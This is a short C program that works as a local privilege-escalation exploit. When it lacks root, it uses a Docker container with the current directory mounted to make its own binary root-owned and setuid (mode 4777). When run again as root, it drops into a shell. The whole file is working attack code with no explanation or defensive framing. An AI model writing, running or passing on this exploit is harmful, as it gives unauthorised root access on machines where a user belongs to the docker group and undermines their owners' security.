#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    if(setuid(0) == -1 || setgid(0) == -1) {
        puts("trying");
        char *args1[] = {"/bin/sh", "-c", "docker run --rm -v `pwd`:/x alpine /bin/sh -c \"chown 0.0 /x/r && chmod 4777 /x/r && echo success\"", NULL};
        execve("/bin/sh", args1, NULL);
        return 0;
    }

    char *args2[] = {NULL};
    execve("/bin/sh", args2, NULL);
    return 0;
}

